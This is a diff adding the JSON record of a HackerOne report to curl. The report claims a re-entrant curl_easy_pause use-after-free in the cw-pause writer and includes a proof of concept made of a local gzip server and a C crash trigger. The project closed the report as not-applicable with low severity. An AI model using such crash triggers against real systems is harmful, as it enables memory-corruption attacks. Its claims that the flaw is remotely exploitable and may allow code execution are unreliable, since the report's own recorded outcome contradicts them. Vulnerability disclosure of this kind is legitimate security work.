@@ -1,0 +1,112 @@
+{
+  "id": 4166602,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MTY2NjAy",
+  "url": "https://hackerone.com/reports/4166602",
+  "title": "Re-entrant curl_easy_pause UAF in cw-pause",
+  "state": "Closed",
+  "substate": "not-applicable",
+  "severity_rating": "low",
+  "readable_substate": "N/A",
+  "created_at": "2026-11-02T06:02:26.744Z",
+  "submitted_at": "2026-11-02T06:02:26.929Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "gube-dev",
+    "url": "/gube-dev",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/bl3jub3szbzj0niifr884w2deguu/f4770e29726b679d8210b3bcebb50139392345e8ead50e7d67de79a93076e327"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/dd1dfc8fc7352772e4a8994c07e1d628d34edc74db48377c707f10829dc23d53",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/2a499a0b732abf809ef45635d9ad400431480fafd17452e700cbdba6fd64fe85"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-11-03T13:06:55.971Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-11-02T12:46:50.917Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary\nThis report is a bypass of the prior fix for the nested `curl_easy_pause()` re-entrancy issue described in HackerOne report #4102061. The original patch guarded the writer path in `lib/cw-out.c` by adding a re-entrancy guard around `cw_out_flush_chain()`, but it did not guard the sibling writer implementation in `lib/cw-pause.c`.\n\nThe vulnerable behavior remains reachable because `cw-pause` is installed earlier in the writer chain (`CURL_CW_BEFORE_DECODE`) than the patched `cw-out` path (`CURL_CW_CLIENT`). When a write callback returns `CURL_WRITEFUNC_PAUSE`, libcurl marks the transfer paused and eventually re-enters the flush path. If the callback stack then calls `curl_easy_pause(CURLPAUSE_RECV)` followed by `curl_easy_pause(CURLPAUSE_CONT)`, the nested continue re-enters the writer stack from the head while the outer frame still holds `first = ctx->buf`. The nested flush can free or invalidate the same buffer node the outer frame still intends to use. The result is a classic heap use-after-free / double-free in the paused body replay path.\n\nThis is not a different bug in a different subsystem; it is the same class of issue as the earlier report, but at a second crash site. The original fix addressed only one writer implementation, leaving the earlier `cw-pause` flush re-entrancy path intact and therefore bypassing the mitigation.\n\nThe issue is reachable from attacker-controlled HTTP content when the server sends a gzip/deflate/brotli/zstd-compressed body and the client code pauses inside a write or debug callback. This is a high-risk memory-corruption condition in a widely used networking library and can lead to corruption of adjacent heap state and potentially arbitrary code execution in the embedding process.\n\n## Steps to Reproduce\n1. Build libcurl from source with ASan enabled, using a tree that includes the prior fix for `cw-out` but still lacks a guard in `cw-pause`.\n2. Start a local HTTP server that serves a gzip-compressed response on 127.0.0.1.\n3. Compile the standalone PoC below against that local libcurl build.\n4. The PoC sets `CURLOPT_ACCEPT_ENCODING` to `gzip`, enables verbose tracing, and registers both a `WRITEFUNCTION` and a `DEBUGFUNCTION`.\n5. In the write callback, the first body chunk returns `CURL_WRITEFUNC_PAUSE`.\n6. In the debug callback, when it sees the trace text `PAUSE requested`, it calls `curl_easy_pause(CURLPAUSE_RECV)` and then immediately `curl_easy_pause(CURLPAUSE_CONT)`.\n7. The nested continue re-enters the writer stack while the outer flush still holds the same `cw_pause_buf` node, triggering the UAF/double-free.\n8. On ASan builds, this is observed as a heap-use-after-free or double-free in libcurl. On a non-ASan debug build, it generally crashes or aborts in heap management code.\n\n## Proof of Concept\n\n### `gzip_server.py`\n```python\n#!/usr/bin/env python3\nimport gzip\nimport http.server\nimport socketserver\n\npayload = (b'A' * 6000) + b'\\n' + (b'B' * 6000)\ncompressed = gzip.compress(payload)\n\nclass Handler(http.server.BaseHTTPRequestHandler):\n    def do_GET(self):\n        body = compressed\n        self.send_response(200)\n        self.send_header('Content-Type', 'text/plain; charset=utf-8')\n        self.send_header('Content-Encoding', 'gzip')\n        self.send_header('Content-Length', str(len(body)))\n        self.end_headers()\n        self.wfile.write(body)\n\n    def log_message(self, fmt, *args):\n        pass\n\nif __name__ == '__main__':\n    print(f'Serving gzip payload ({len(compressed)} compressed bytes) on http://127.0.0.1:18080/')\n    with socketserver.TCPServer(('127.0.0.1', 18080), Handler) as httpd:\n        httpd.serve_forever()\n```\n\n### `poc.c`\n```c\n#include <curl/curl.h>\n#include <stdio.h>\n#include <string.h>\n\nstruct state {\n  int write_paused;\n  int nested;\n};\n\nstatic int contains(const char *buf, size_t len, const char *needle) {\n  size_t n = strlen(needle);\n  size_t i;\n\n  if (len < n)\n    return 0;\n\n  for (i = 0; i <= len - n; ++i) {\n    if (memcmp(buf + i, needle, n) == 0)\n      return 1;\n  }\n\n  return 0;\n}\n\nstatic size_t write_cb(char *ptr, size_t size, size_t nmemb, void *userdata) {\n  struct state *st = (struct state *)userdata;\n  size_t total = size * nmemb;\n\n  if (!st->write_paused) {\n    st->write_paused = 1;\n    fprintf(stderr, \"[write_cb] returning CURL_WRITEFUNC_PAUSE\\n\");\n    return CURL_WRITEFUNC_PAUSE;\n  }\n\n  fwrite(ptr, size, nmemb, stdout);\n  return total;\n}\n\nstatic int debug_cb(CURL *easy, curl_infotype type, char *data, size_t size,\n                    void *userdata) {\n  struct state *st = (struct state *)userdata;\n\n  if (type == CURLINFO_TEXT && !st->nested) {\n    const char want[] = \"PAUSE requested\";\n    if (contains(data, size, want)) {\n      st->nested = 1;\n      fprintf(stderr, \"[debug_cb] curl_easy_pause(RECV); curl_easy_pause(CONT)\\n\");\n      curl_easy_pause(easy, CURLPAUSE_RECV);\n      curl_easy_pause(easy, CURLPAUSE_CONT);\n    }\n  }\n\n  return 0;\n}\n\nint main(int argc, char **argv) {\n  CURL *easy;\n  CURLcode rc;\n  const char *url = argc > 1 ? argv[1] : \"http://127.0.0.1:18080/\";\n  struct state st = {0, 0};\n\n  rc = curl_global_trace(\"write\");\n  if (rc != CURLE_OK) {\n    fprintf(stderr, \"curl_global_trace failed: %s\\n\", curl_easy_strerror(rc));\n    return 1;\n  }\n\n  easy = curl_easy_init();\n  if (!easy) {\n    fprintf(stderr, \"curl_easy_init failed\\n\");\n    return 1;\n  }\n\n  curl_easy_setopt(easy, CURLOPT_URL, url);\n  curl_easy_setopt(easy, CURLOPT_VERBOSE, 1L);\n  curl_easy_setopt(easy, CURLOPT_DEBUGFUNCTION, debug_cb);\n  curl_easy_setopt(easy, CURLOPT_DEBUGDATA, &st);\n  curl_easy_setopt(easy, CURLOPT_WRITEFUNCTION, write_cb);\n  curl_easy_setopt(easy, CURLOPT_WRITEDATA, &st);\n  curl_easy_setopt(easy, CURLOPT_ACCEPT_ENCODING, \"gzip\");\n\n  fprintf(stderr, \"[main] starting transfer to %s\\n\", url);\n  rc = curl_easy_perform(easy);\n  fprintf(stderr, \"[main] curl_easy_perform -> %d (%s)\\n\", (int)rc,\n          curl_easy_strerror(rc));\n\n  curl_easy_cleanup(easy);\n  return 0;\n}\n```\n\n### Build and run\n```bash\n# Terminal 1\npython3 gzip_server.py\n\n# Terminal 2\nclang -fsanitize=address -g -O1 -I /path/to/libcurl/include \\\n  -o poc poc.c /path/to/libcurl/lib/libcurl.a -lz\n\nASAN_OPTIONS=detect_leaks=0 ./poc http://127.0.0.1:18080/\n```\n\nExpected output on an affected build:\n```text\n[write_cb] returning CURL_WRITEFUNC_PAUSE\n[debug_cb] curl_easy_pause(RECV); curl_easy_pause(CONT)\n=================================================================\n==12345==ERROR: AddressSanitizer: heap-use-after-free\n...\n#0 ... in cw_pause_flush\n...\n```\n\n## Remediation\nThe correct fix is to apply the same re-entrancy guard pattern to `lib/cw-pause.c` that was added to `lib/cw-out.c`. Specifically, add a per-context flush guard (for example `BIT(flushing)` or equivalent), short-circuit nested flushes before touching `ctx->buf`, and force the outer loop to re-evaluate state after a nested callback returns instead of assuming the current node is still valid.\n\nA more robust long-term fix is to enforce re-entrancy protection once at the writer-stack level, in `Curl_cwriter_flush()` / `Curl_cwriter_unpause()`, so future writers cannot reintroduce the same bug clas\n\n## Impact\n\nThe issue is exploitable from a hostile or compromised HTTP server that can legitimately serve gzip/deflate/brotli/zstd-compressed content. A client application that uses a write or debug callback and calls `curl_easy_pause()` inside that callback is vulnerable. Heap use-after-free or double-free in libcurl can corrupt adjacent memory and may enable remote code execution in the embedding application.\n\nThis is particularly important for software that accepts untrusted HTTP responses, including proxies, download managers, security tooling, and SDKs that rely on libcurl for network I/O. The impact is equivalent to the original vulnerability class, but it bypasses the fix for the earlier report by reintroducing the same flaw in the sibling pause writer.",
+  "weakness": {
+    "id": 50,
+    "name": "Use After Free"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 0,
+  "voters": [],
+  "severity": {
+    "rating": "low",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": [],
+    "can_view_ave_report?": false
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
